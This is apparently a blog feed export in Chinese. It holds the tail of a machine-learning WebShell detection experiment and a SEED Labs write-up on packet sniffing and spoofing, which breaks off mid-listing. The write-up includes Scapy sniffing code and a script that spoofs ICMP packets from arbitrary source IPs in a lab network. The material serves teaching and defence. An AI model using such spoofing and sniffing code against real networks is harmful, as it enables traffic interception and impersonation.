库中用于将文本数据转换为词频矩阵的工具</span><br>    count_vectorizer = CountVectorizer(ngram_range=(<span class="hljs-number">2</span>, <span class="hljs-number">2</span>), decode_error=<span class="hljs-string">&quot;ignore&quot;</span>,<br>                                       min_df=<span class="hljs-number">1</span>, analyzer=<span class="hljs-string">&quot;word&quot;</span>,<br>                                       token_pattern=<span class="hljs-string">r&#x27;[^\w\s]+|\b\w+\b&#x27;</span>,<br>                                       max_features=max_features)<br>    <span class="hljs-comment"># 创建一个 TF-IDF 转换器的实例。smooth_idf 参数控制是否应用平滑化（默认为 True）。在这里，设置为 False 表示不进行平滑化。</span><br>    tfidf_transformer = TfidfTransformer(smooth_idf=<span class="hljs-literal">False</span>)<br>    <span class="hljs-comment"># 将文本数据 texts 转换为词频矩阵</span><br>    cv_x = count_vectorizer.fit_transform(texts).toarray()<br>    <span class="hljs-comment"># TfidfTransformer 是 Scikit-learn 库中用于将词频矩阵转换为 TF-IDF（Term Frequency-Inverse Document Frequency，词频-逆文档频率） 矩阵的工具。</span><br>    tf_x = tfidf_transformer.fit_transform(cv_x).toarray()<br><br>    <span class="hljs-keyword">return</span> tf_x, labels, count_vectorizer, tfidf_transformer<br><br><br><span class="hljs-comment"># 用于评估模型的性能并输出相关结果</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">evaluation</span>(<span class="hljs-params">y_test, y_pred, title</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;title&#125;</span> 模型评估结果：&quot;</span>)<br>    <span class="hljs-comment"># 打印模型准确率</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;准确率:%s&quot;</span> % metrics.accuracy_score(y_test, y_pred))<br>    <span class="hljs-comment"># 打印模型精确率</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;精确率:%s&quot;</span> % metrics.precision_score(y_test, y_pred))<br>    <span class="hljs-comment"># 打印混淆矩阵</span><br>    <span class="hljs-built_in">print</span>(confusion_matrix(y_test, y_pred))<br>    <span class="hljs-comment"># # 打印分类报告</span><br>    <span class="hljs-comment"># print(classification_report(y_test, y_pred))</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">train_and_save_model</span>(<span class="hljs-params">train_set, labels, mode, seed</span>):<br>    <span class="hljs-comment"># 将数据集划分为训练集和测试集</span><br>    x_train, x_test, y_train, y_test = train_test_split(train_set, labels, test_size=<span class="hljs-number">0.3</span>, random_state=seed)<br>    <span class="hljs-comment"># 使用 model_collection 函数根据模型类型创建分类器（clf）</span><br>    clf = model_collection(mode)<br>    <span class="hljs-comment"># 使用训练集训练模型</span><br>    clf.fit(x_train, y_train)<br>    <span class="hljs-comment"># 评估模型性能</span><br>    evaluation(y_test, clf.predict(x_test), mode)<br>    <span class="hljs-comment"># 保存模型</span><br>    model_name = <span class="hljs-string">f&quot;work/<span class="hljs-subst">&#123;mode&#125;</span>_model.pkl&quot;</span><br>    joblib.dump(clf, model_name, compress=<span class="hljs-number">3</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;mode&#125;</span> 模型已保存到 <span class="hljs-subst">&#123;model_name&#125;</span>&quot;</span>)<br><br><span class="hljs-comment"># 数据集路径</span><br>positive_zip = <span class="hljs-string">&quot;data/data61842/php-benign.zip&quot;</span><br>negative_zip = <span class="hljs-string">&quot;data/data61842/php-webshell.zip&quot;</span><br><br><span class="hljs-comment"># 参数</span><br><span class="hljs-comment"># 特征维度影响模型性能，高维度可能导致过拟合和计算成本增加，适当选择和处理特征能提升模型的泛化能力</span><br><span class="hljs-comment"># 设置随机种子保证实验可复现，确保每次运行相同的随机性操作得到一致的结果</span><br>max_features = <span class="hljs-number">25000</span><br>seed = <span class="hljs-number">777</span>  <br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;初始化参数：&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;白样本路径：%s&quot;</span> % positive_zip)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;黑样本路径：%s&quot;</span> % negative_zip)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;随机种子：%s&quot;</span> % seed)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;特征维度：%s&quot;</span> % max_features)<br><br><span class="hljs-comment"># s_time 变量被赋值为当前时间戳，表示开始时间（start time）</span><br>s_time = time.time()<br><br><span class="hljs-comment"># 特征处理</span><br>x, y,count_vectorizer, tfidf_transformer = features_process(negative_zip, positive_zip, max_features)<br><br><span class="hljs-comment"># 训练和保存模型</span><br>train_and_save_model(x, y, <span class="hljs-string">&#x27;mlp&#x27;</span>, seed)<br>train_and_save_model(x, y, <span class="hljs-string">&#x27;xgb&#x27;</span>, seed)<br>train_and_save_model(x, y, <span class="hljs-string">&#x27;gnb&#x27;</span>, seed)<br><br><span class="hljs-comment"># e_time 变量被赋值为当前时间戳，表示结束时间（end time）</span><br>e_time = time.time()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;训练总耗时：%s&quot;</span> % <span class="hljs-built_in">str</span>(e_time - s_time))<br></code></pre></td></tr></table></figure><h2 id="模型测试">2. 模型测试</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">evaluate_php_file</span>(<span class="hljs-params">file_path, model_path</span>):<br>    <span class="hljs-comment"># 加载训练好的模型</span><br>    clf = joblib.load(model_path)<br><br>    <span class="hljs-comment"># 读取用户提供的 PHP 文件内容</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_path, <span class="hljs-string">&#x27;r&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>        user_php_content = file.read()<br><br>    <span class="hljs-comment"># Fit and transform the CountVectorizer on the user-provided content</span><br>    user_features = count_vectorizer.transform([user_php_content]).toarray()<br><br>    <span class="hljs-comment"># 使用模型进行预测</span><br>    prediction = clf.predict(tfidf_transformer.transform(user_features))<br><br>    <span class="hljs-keyword">if</span> prediction[<span class="hljs-number">0</span>] == <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;用户提供的 PHP 文件是安全的。&quot;</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;用户提供的 PHP 文件可能包含恶意代码。&quot;</span><br><br><span class="hljs-comment"># 使用示例</span><br>file_path = <span class="hljs-string">&quot;work/file.php&quot;</span><br>model_path = <span class="hljs-string">&quot;work/xgb_model.pkl&quot;</span><br><br>result = evaluate_php_file(file_path, model_path)<br><span class="hljs-built_in">print</span>(result)<br></code></pre></td></tr></table></figure><h1 id="doc">Doc</h1><h2 id="概述">1. 概述</h2><h3 id="实验目的">1.1 实验目的</h3><p>本实验旨在设计和构建一个用于WebShell检测的机器学习模型。通过该实验，我们需要验证不同分类器在WebShell检测任务上的性能，包括多层感知机（MLP），XGBoost，和高斯朴素贝叶斯（GaussianNaive Bayes），并找到在给定数据集上表现最佳的模型。</p><h3 id="数据集">1.2 数据集</h3><p>高质量的训练样本是决定模型好坏的先决条件。本实验使用两个数据集进行训练和评估：正常php文件(PHP-benign)和WebShell(PHP-webshell)的数据集。这两个数据集分别储存在<code>php-benign.zip</code>和<code>php-webshell.zip</code>文件中。</p><h2 id="实验记录">2. 实验记录</h2><h3 id="初始化参数">2.1 初始化参数</h3><p>实验开始时，我们设置了关键参数，包括白样本路径、黑样本路径、随机种子和特征维度。这些参数对于实验的可复现性和性能调整至关重要。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311181704366.png"alt="image-20231118164750596" /><figcaption aria-hidden="true">image-20231118164750596</figcaption></figure><h3 id="特征处理">2.2 特征处理</h3><ol type="1"><li><strong>文本预处理：</strong>首先，对于每个以<code>.php</code>结尾的文件，我们进行了文本预处理操作。这包括将文件内容以字符串形式读取，并对其进行UTF-8解码，以确保文本数据的一致性和正确性。此外，我们使用了忽略非法字符的策略，处理可能存在的非法字符。</li><li><strong>文本分词与标记化：</strong>通过CountVectorizer，我们将文本数据进行分词和标记化。具体而言，我们使用了n-gram模型，设置ngram_range=(2,2)，以考虑相邻的2个词语，更好地捕捉潜在的特征。此外，我们通过正则表达式<code>token_pattern=r'[^\w\s]+|\b\w+\b'</code>进行标点符号和空格的处理，以保留有效的文本信息。</li><li><strong>词频矩阵转换：</strong>利用CountVectorizer将文本数据转换为词频矩阵，该矩阵表示每个文档中词语的出现频率。我们设置了<code>max_features</code>参数，限制了词频矩阵中特征的数量，以避免高维度可能导致的过拟合和计算成本增加问题。</li><li><strong>TF-IDF转换：</strong>进一步，通过TF-IDF转换器，我们将词频矩阵转换为TF-IDF矩阵。TF-IDF考虑了词语在整个语料库中的重要性，对高频词进行了降权，从而更好地捕捉文档中关键词的信息。</li></ol><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311181704367.png"alt="image-20231118164110441" /><figcaption aria-hidden="true">image-20231118164110441</figcaption></figure><h3 id="分类器选择">2.3 分类器选择</h3><p>本实验选择了三种不同类型的分类器进行比较：</p><ol type="1"><li><strong>多层感知机（MLP）：</strong>通过<code>MLPClassifier</code>实现，MLP是一种深度学习模型，适用于复杂的非线性关系。</li><li><strong>XGBoost：</strong>通过<code>XGBClassifier</code>实现，XGBoost是一种基于梯度提升树的机器学习算法，在处理复杂数据集和特征时表现出色。</li><li><strong>高斯朴素贝叶斯（Gaussian Naive Bayes）：</strong>通过<code>GaussianNB</code>实现，朴素贝叶斯是一种基于贝叶斯定理的统计分类器，适用于特征之间相互独立的情况。</li></ol><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311181704368.png"alt="image-20231118164537948" /><figcaption aria-hidden="true">image-20231118164537948</figcaption></figure><h3 id="模型训练">2.4 模型训练</h3><p>利用<code>train_and_save_model</code>函数，我们将数据集划分为训练集和测试集，并使用不同的分类器进行模型训练。最后，保存了训练好的模型，方便后续使用。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311181704369.png"alt="image-20231118164934553" /><figcaption aria-hidden="true">image-20231118164934553</figcaption></figure><h3 id="模型评估">2.5 模型评估</h3><p>使用测试集对训练好的模型进行评估。通过调用<code>evaluation</code>函数，计算模型的准确率、精确率和混淆矩阵等性能指标。这些指标提供了模型的性能表现。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311181704370.png"alt="image-20231118165122890" /><figcaption aria-hidden="true">image-20231118165122890</figcaption></figure><h3 id="结果分析">2.6 结果分析</h3><p>实验结果显示，在所选的三种分类器中，XGBoost表现最佳，对WebShell检测任务具有更高的准确率和精确率。</p><h4 id="多层感知机">2.6.1 多层感知机</h4><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311181704371.png"alt="image-20231118165234892" /><figcaption aria-hidden="true">image-20231118165234892</figcaption></figure><h4 id="xgboost">2.6.2 XGBoost</h4><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311181704372.png"alt="image-20231118165255319" /><figcaption aria-hidden="true">image-20231118165255319</figcaption></figure><h4 id="高斯朴素贝叶斯">2.6.3 高斯朴素贝叶斯</h4><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311181704373.png"alt="image-20231118165314037" /><figcaption aria-hidden="true">image-20231118165314037</figcaption></figure><h2 id="测试">3. 测试</h2><p>以下是用于测试WebShell检测模型的Python代码。该代码通过加载训练好的模型，读取用户提供的PHP文件内容，并使用模型进行预测，从而判断用户提供的PHP文件是否包含恶意代码。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311181704374.png"alt="image-20231118165657622" /><figcaption aria-hidden="true">image-20231118165657622</figcaption></figure>]]></content>
    
    
    <categories>
      
      <category>机器学习</category>
      
      <category>实践篇</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Packet Sniffing and Spoofing</title>
    <link href="/2023/11/15/SEED-LABS/Network%20Security/Packet%20Sniffing%20and%20Spoofing/"/>
    <url>/2023/11/15/SEED-LABS/Network%20Security/Packet%20Sniffing%20and%20Spoofing/</url>
    
    <content type="html"><![CDATA[<h1 id="overview">1. Overview</h1><p>数据包<strong>嗅探和欺骗</strong>是网络安全中的两个重要概念，也是网络通信中的两大威胁。了解这两种威胁对于理解网络安全措施至关重要。目前有许多数据包嗅探和欺骗工具，如Wireshark、Tcpdump、Netwox、Scapy等。其中一些工具被安全专家和攻击者广泛使用。会使用这些工具对学生来说很重要，但对学习网络安全课程的学生来说更重要的是了解这些工具是如何工作的，即数据包嗅探和欺骗是如何在软件中实现的。</p><p>本实验室有两个目标：学习使用工具和了解这些工具的基础技术。对于第二个目标，学生将编写简单的嗅探器和欺骗程序，并深入了解这些程序的技术方面。本实验室涵盖以下主题：</p><ul><li>嗅探和欺骗的工作原理</li><li>使用 pcap 库和 Scapy 进行数据包嗅探</li><li>使用原始套接字和 Scapy 进行数据包欺骗</li><li>使用 Scapy 操纵数据包</li></ul><h1 id="environment-setup-using-container">2. Environment Setup usingContainer</h1><p>在本实验室中，我们将使用连接到同一局域网的三台机器。我们既可以使用三台虚拟机，也可以使用三个容器。图1描述了使用容器的实验室环境设置。我们将在攻击者容器上进行所有攻击，同时使用其他容器作为用户机器。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311151813785.png"alt="image-20231115142430163" /><figcaption aria-hidden="true">image-20231115142430163</figcaption></figure><h2 id="container-setup-and-commands">2.1 Container Setup andCommands</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ dcbuild <span class="hljs-comment"># Alias for: docker-compose build</span><br>$ dcup <span class="hljs-comment"># Alias for: docker-compose up</span><br>$ dcdown <span class="hljs-comment"># Alias for: docker-compose down</span><br><br>$ dockps // Alias <span class="hljs-keyword">for</span>: docker ps --format <span class="hljs-string">&quot;&#123;&#123;.ID&#125;&#125; &#123;&#123;.Names&#125;&#125;&quot;</span><br>$ docksh &lt;<span class="hljs-built_in">id</span>&gt; // Alias <span class="hljs-keyword">for</span>: docker <span class="hljs-built_in">exec</span> -it &lt;<span class="hljs-built_in">id</span>&gt; /bin/bash<br></code></pre></td></tr></table></figure><h2 id="about-the-attacker-container">2.2 About the AttackerContainer</h2><p>在本实验室中，我们可以使用<strong>虚拟机或攻击者容器</strong>作为攻击者机器。如果查看Docker Compose文件，你会发现攻击者容器的配置与其他容器不同。以下是不同之处：</p><ul><li><p>共享文件夹。当我们使用攻击者容器发动攻击时，需要将攻击代码放在攻击者容器内。在虚拟机中编辑代码比在容器中更方便，因为我们可以使用自己喜欢的编辑器。为了让虚拟机和容器共享文件，我们使用Docker 卷在虚拟机和容器之间创建了一个共享文件夹。如果查看 Docker Compose文件，你会发现我们在某些容器中添加了以下条目。它表示将主机（即虚拟机）上的./volumes 文件夹挂载到容器内的 /volumes 文件夹。我们将在 ./volumes文件夹（虚拟机上）中编写代码，以便在容器内使用它们。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312131722772.png"alt="image-20231213162539849" /><figcaption aria-hidden="true">image-20231213162539849</figcaption></figure></li><li><p>主机模式。在本实验室中，攻击者需要能够嗅探数据包，但在容器内运行嗅探程序会有问题，因为容器实际上是连接到虚拟交换机上的，所以它只能看到自己的流量，而永远看不到其他容器中的数据包。为了解决这个问题，我们为攻击者容器使用主机模式。这样，攻击者容器就能看到所有流量。当容器处于主机模式时，它可以看到主机的所有网络接口，甚至拥有与主机相同的IP地址。不过，容器仍是一台独立的机器，因为它的其他命名空间仍与主机不同。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312131722773.png"alt="image-20231213162615726" /><figcaption aria-hidden="true">image-20231213162615726</figcaption></figure></li></ul><p><strong>获取网络接口名称</strong>：当我们使用提供的 Compose文件为本实验室创建容器时，会创建一个新的网络来连接虚拟机和容器。这个网络的IP 前缀是10.9.0.0/24，它是在 docker-compose.yml文件中指定的。分配给我们虚拟机的 IP 地址是10.9.0.1。我们需要找到虚拟机上相应网络接口的名称，因为我们需要在程序中使用它。接口名称是由br- 和 Docker 创建的网络 ID 连接而成的。当我们使用 ifconfig列出网络接口时，我们会看到很多。查找 IP 地址 10.9.0.1。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312131722774.png"alt="image-20231213162730442" /><figcaption aria-hidden="true">image-20231213162730442</figcaption></figure><p>另一种获取接口名称的方法是使用 "docker network "命令自行查找网络ID（网络名称为 seed-net）：</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312131722775.png"alt="image-20231213162752088" /><figcaption aria-hidden="true">image-20231213162752088</figcaption></figure><h1 id="lab-task-set-1-using-scapy-to-sniff-and-spoof-packets">3. LabTask Set 1: Using Scapy to Sniff and Spoof Packets</h1><p>许多工具都可以用来进行嗅探和欺骗，但它们大多只提供固定的功能。 Scapy则不同：它不仅可以作为工具使用，还可以作为构建其他嗅探和欺骗工具的构件，也就是说，我们可以将Scapy 的功能集成到自己的程序中。在这组任务中，我们将使用 Scapy完成每项任务。</p><p>要使用 Scapy，我们可以编写一个 Python 程序，然后用 Python执行该程序。请看下面的示例。我们应该使用 root 权限运行Python，因为欺骗数据包需要该权限。在程序的开头（第 ➀ 行），我们应该导入Scapy 的所有模块。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312131722777.png"alt="image-20231213162900878" /><figcaption aria-hidden="true">image-20231213162900878</figcaption></figure><p>我们还可以进入 Python 的交互模式，然后在Python提示符下一行一行地运行程序。如果我们需要在实验中频繁修改代码，这将更加方便。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312131722778.png"alt="image-20231213162933176" /><figcaption aria-hidden="true">image-20231213162933176</figcaption></figure><h2 id="task-1.1-sniffing-packets">3.1 Task 1.1: Sniffing Packets</h2><p>Wireshark 是最流行的嗅探工具，而且使用方便。不过，要将 Wireshark用作构建其他工具的基石并不容易。为此，我们将使用Scapy。本任务的目的是学习如何使用 Scapy 在 Python程序中进行数据包嗅探。下面提供了一段示例代码：</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312131722779.png"alt="image-20231213163007141" /><figcaption aria-hidden="true">image-20231213163007141</figcaption></figure><p>上述代码将嗅探 br-c93733e9f913接口上的数据包。请阅读实验室设置部分关于如何获取接口名称的说明。如果我们想嗅探多个接口，可以将所有接口放入一个列表，并将其分配给iface。请参阅以下示例：</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312131722780.png"alt="image-20231213163035721" /><figcaption aria-hidden="true">image-20231213163035721</figcaption></figure><h3 id="task-1.1a">Task 1.1A</h3><p>在上述程序中，每捕获一个数据包，就会调用回调函数 printpkt()；该函数将打印出数据包的部分信息。以 root权限运行程序，证明你确实可以捕获数据包。然后，再次运行程序，但不使用root 权限；描述并解释你的观察结果。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312131722781.png"alt="image-20231213163119767" /><figcaption aria-hidden="true">image-20231213163119767</figcaption></figure><p><strong>实验流程：</strong></p><ol type="1"><li><p>代码说明：<code>show()</code>用于显示数据包的详细信息。<code>sniff()</code>从网络接口捕获数据包。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">from</span> scapy.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">print_pkt</span>(<span class="hljs-params">pkt</span>):<br>pkt.show()<br><span class="hljs-comment"># 根据具体需求更改网卡</span><br>pkt = sniff(iface=<span class="hljs-string">&#x27;br-1efe4687329b&#x27;</span>, <span class="hljs-built_in">filter</span>=<span class="hljs-string">&#x27;icmp&#x27;</span>, prn=print_pkt)<br></code></pre></td></tr></table></figure></li><li><p>root权限运行，使用ping命令产生ICMP数据包，成功捕获指定网卡上的数据包。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311151813788.png"alt="image-20231115144546347" /><figcaption aria-hidden="true">image-20231115144546347</figcaption></figure></li><li><p>普通权限运行，出现报错。在 Linux 系统下，一般情况下需要 root权限才能够执行网络数据包捕获操作。这是因为网络接口的访问通常受到系统的保护，只有具有足够权限的用户才能够进行这类敏感操作。</p></li></ol><h3 id="task-1.1b">Task 1.1B</h3><p>通常，当我们嗅探数据包时，我们只对某些类型的数据包感兴趣。我们可以通过在嗅探中设置过滤器来做到这一点。Scapy的过滤器使用 BPF（伯克利数据包过滤器）语法；您可以从互联网上找到BPF手册。请设置以下过滤器，并再次演示你的嗅探器程序（每个过滤器应单独设置）：</p><ul><li>只捕获 ICMP 数据包</li><li>捕获来自特定 IP 且目标端口号为 23 的任何 TCP 数据包。</li><li>捕获来自或前往特定子网的数据包。您可以选择任何子网，如128.230.0.0/16；但不应选择虚拟机所连接的子网。</li></ul><p><strong>BPF简介</strong></p><p>BPF(Berkeley PacketFilter)全称为伯克利包过滤，是一种功能非常强大的过滤语法。这个语法被广泛应用于多种数据包嗅探软件,因为大部分数据包嗅探软件都依赖于使用BPF的libpcap/WinPcap库，诸如tcpdump,wireshark等等。</p><p><strong>BPF详解</strong></p><p>使用BPF语法创建的过滤器被称为表达式，并且每个表达式包含一个或多个原语。原语是对网络协议标头中的字段（例如，主机、端口或TCP端口）的引用，通常包含以一个或多个限定符作为前缀的标识（通常为名称或数字）。</p><p><strong>BPF限定符</strong></p><table><thead><tr class="header"><th style="text-align: center;">限定符</th><th style="text-align: center;">说明</th><th style="text-align: center;">例子</th></tr></thead><tbody><tr class="odd"><td style="text-align: center;">Type</td><tdstyle="text-align: center;">用于指示标识名称或数字所引用的信息类型</td><td style="text-align: center;">host、net、port 或 portrange</td></tr><tr class="even"><td style="text-align: center;">Dir</td><td style="text-align: center;">指定与标识相关的传输方向</td><td style="text-align: center;">src、dst 或 src or dst</td></tr><tr class="odd"><td style="text-align: center;">Proto</td><td style="text-align: center;">将协议匹配限制于特定协议</td><tdstyle="text-align: center;">ether、fddi、tr、wlan、ip、ip6、arp、rarp、decnet、TCP或 UDP</td></tr></tbody></table><p><strong>实验流程：</strong></p><ul><li><p>只捕获ICMP</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">filter</span>=<span class="hljs-string">&#x27;icmp&#x27;</span><br></code></pre></td></tr></table></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312131722782.png"alt="image-20231213163638551" /><figcaption aria-hidden="true">image-20231213163638551</figcaption></figure></li><li><p>捕获特定源IP和目的端口的TCP包（注：可通过telnet命令产生TCP数据包，telnet协议是TCP/IP协议栈中的一员，它是基于tcp协议，使用的端口号是23）</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">filter</span>=<span class="hljs-string">&#x27;tcp and src host 10.9.0.5 and dst port 23&#x27;</span><br></code></pre></td></tr></table></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312131722783.png"alt="image-20231213163742491" /><figcaption aria-hidden="true">image-20231213163742491</figcaption></figure></li><li><p>捕获源或目的IP属于某特定子网</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-comment">//ping命令得到百度服务器地址</span><br><span class="hljs-built_in">filter</span>=<span class="hljs-string">&#x27;net 39.156.66.0/23&#x27;</span><br></code></pre></td></tr></table></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312131722784.png"alt="image-20231213163838418" /><figcaption aria-hidden="true">image-20231213163838418</figcaption></figure></li></ul><h2 id="task-1.2-spoofing-icmp-packets">3.2 Task 1.2: Spoofing ICMPPackets</h2><p>作为一种数据包欺骗工具，Scapy 允许我们将 IP数据包的字段设置为任意值。本任务的目标是使用任意源 IP 地址欺骗 IP数据包。我们将欺骗 ICMP echo请求数据包，并将其发送到同一网络上的另一个虚拟机。我们将使用 Wireshark观察接收方是否接受我们的请求。如果接受了，就会向被欺骗的 IP地址发送回声应答数据包。下面的代码举例说明了如何欺骗 ICMP 数据包。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312131722785.png"alt="image-20231213164002173" /><figcaption aria-hidden="true">image-20231213164002173</figcaption></figure><p>在上面的代码中，第 ➀ 行根据 IP 类创建了一个 IP 对象；每个 IP头字段都定义了一个类属性。我们可以使用 ls(a) 或 ls(IP)查看所有属性名/值。我们还可以使用 a.show() 和 IP.show()来完成同样的操作。第➁行显示了如何设置目标 IP地址字段。如果未设置字段，将使用默认值。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312131722786.png"alt="image-20231213164038802" /><figcaption aria-hidden="true">image-20231213164038802</figcaption></figure><p>第➂行创建一个 ICMP 对象。默认类型是 echo 请求。在第➃ 行，我们将 a 和b 堆叠在一起，形成一个新对象。/ 操作符已被 IP类重载，因此它不再表示除法，而是表示将 b 添加为 a的有效载荷字段，并相应修改 a 的字段。这样，我们就得到了一个代表 ICMP数据包的新对象。现在，我们可以使用第➄行中的 send()发送这个数据包。请对示例代码进行任何必要的修改，然后演示如何使用任意源IP 地址欺骗 ICMP echo 请求数据包。</p><p><strong>实验流程：</strong></p><ol type="1"><li><p>编写代码：构造发送ICMP请求数据包</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">from</span> scapy.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><span class="hljs-comment"># 创建IP对象</span><br>a=IP()<br>src_ip=<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;input an arbitrary source IP address:&#x27;</span>)<br>a.src=src_ip<br>a.dst=<span class="hljs-string">&#x27;10.9.0.5&#x27;</span><br><span class="hljs-comment"># 创建ICMP对象</span><br>b=ICMP()<br><span class="hljs-comment"># 添加b作为a的有效载荷字段，并相应修改a的字段</span><br>p=a/b<br>send(p)<br></code></pre></td></tr></table></figure></li><li><p>运行结果</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311151813789.png"alt="image-20231115152148646" /><figcaption aria-hidden="true">image-20231115152148646</figcaption></figure></li></ol><h2 id="task-1.3-traceroute">3.3 Task 1.3: Traceroute</h2><p>本任务的目的是使<strong>用 Scapy估算虚拟机与选定目的地之间的距离</strong>（以路由器数量表示）。这基本上就是traceroute工具所实现的功能。在本任务中，我们将编写自己的工具。这个想法非常简单：只需向目的地发送一个数据包（任意类型），首先将其生存时间（TTL）字段设为1。第一个路由器会丢弃这个数据包，并向我们发送 ICMP错误信息，告诉我们超过了生存时间。这就是我们获取第一个路由器 IP地址的方法。然后，我们将 TTL 字段增加到2，发送另一个数据包，并获得第二个路由器的 IP地址。我们将重复这个过程，直到数据包最终到达目的地。需要注意的是，这个实验只能得到一个估计结果，因为从理论上讲，并非所有这些数据包都会走相同的路线（但实际上，它们可能会在很短的时间内走相同的路线）。下面的代码显示了该过程中的一轮。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312131722787.png"alt="image-20231213164434078" /><figcaption aria-hidden="true">image-20231213164434078</figcaption></figure><p>如果您是经验丰富的 Python程序员，可以编写工具来自动执行整个过程。如果你是 Python编程新手，可以在每一轮中手动更改 TTL 字段，并根据 Wireshark 的观察记录IP 地址。只要能得到结果，哪种方法都可以接受。</p><p><strong>实验流程：</strong></p><ol type="1"><li><p>编写代码：以1为步长，逐渐增大TTL，发送ICMP数据包并接收响应。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 